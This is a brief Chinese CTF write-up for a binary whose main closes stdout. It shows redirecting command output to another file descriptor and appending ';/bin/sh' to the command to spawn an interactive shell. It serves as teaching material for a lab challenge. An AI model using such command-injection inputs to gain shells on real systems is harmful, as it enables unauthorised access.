先看main函数：
![](https://raw.githubusercontent.com/Malrss/picgo/main/pic1/202508232048528.jpg)
`fclose(_bss_start)` = `fclose(stdout)` 关闭了默认**fd=1**的输出，所以system的结果无法直接看到。
思路：
	输出重定向。
```sh
ls 1>&0
ls >&0
ls >&2     ###三种写法均可
```
将输出重定向到能回显的终端并获得一个新的交互式shell：
```sh
ls >&2;/bin/sh
```
![](https://raw.githubusercontent.com/Malrss/picgo/main/pic1/202508232056577.jpg)

